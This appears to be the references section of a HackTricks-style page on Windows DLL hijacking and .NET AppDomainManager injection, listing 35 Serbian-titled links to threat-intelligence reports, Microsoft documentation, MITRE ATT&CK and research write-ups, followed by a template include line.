- [1] [Red Canary – Obaveštajni uvidi: januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Podizanje privilegija pomoću TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking u Windows-u. Jednostavan primer u C-u.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore postavlja novi malware usmeren na Evropu](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hakovanje pristupačnosti: kada se DLL hijackovi susretnu sa Windows pomoćnim alatima](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitalni dvojnici: anatomija evoluirajućih kampanja lažnog predstavljanja koje distribuiraju Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Podudarni interesi: analiza klastera pretnji usmerenih na vladu jedne države jugoistočne Azije](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Unutar Ink Dragon-a: otkrivanje relay mreže i unutrašnjeg funkcionisanja prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Backdoor Chrysalis: detaljna analiza Lotus Blossom-ovog kompleta alata](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack lanac](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Praćenje špijunskih kampanja iranske APT grupe Screening Serpens iz 2026. godine](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Brzi i žestoki: operacije Nimbus Manticore tokom iranskog sukoba](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Radnje zadataka](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 cilja vlade i kritičnu infrastrukturu jugoistočne Azije](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Rekonstrukcija i otkrivanje hijackinga DLL-ova prema redosledu pretrage u Windows-u pomoću Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Pravljenje izvornih biblioteka pomoću Native AOT-a](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Izvorni exporti pomoću Native AOT-a](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Redosled pretrage biblioteka za dinamičko povezivanje](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – PE format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Otkrivanje varijante SectopRAT-a ugrađene u legitiman softver](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Krađa LIGHTSHOW-a (prvi deo)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operacija FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – NetamLoader, .NET framework za učitavanje zasnovan na XAML-u](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
